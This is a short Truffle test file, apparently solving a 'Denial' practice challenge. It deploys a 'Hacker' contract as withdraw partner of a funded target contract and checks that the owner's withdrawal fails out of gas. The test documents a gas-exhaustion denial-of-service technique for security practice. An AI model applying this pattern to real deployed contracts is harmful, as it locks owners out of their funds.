const Hacker = artifacts.require("Hacker");
const Denial = artifacts.require("Denial");
const { expect } = require("chai");
const { BN, expectRevert } = require("@openzeppelin/test-helpers");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should deny owner to withdraw", async function () {
    const hackerContract = await Hacker.new({ from: _hacker });
    const targetContract = await Denial.new();
    await targetContract.send(web3.utils.toWei("1000", "wei"));
    await targetContract.setWithdrawPartner(hackerContract.address);
    expectRevert.outOfGas(targetContract.withdraw());
  });
});
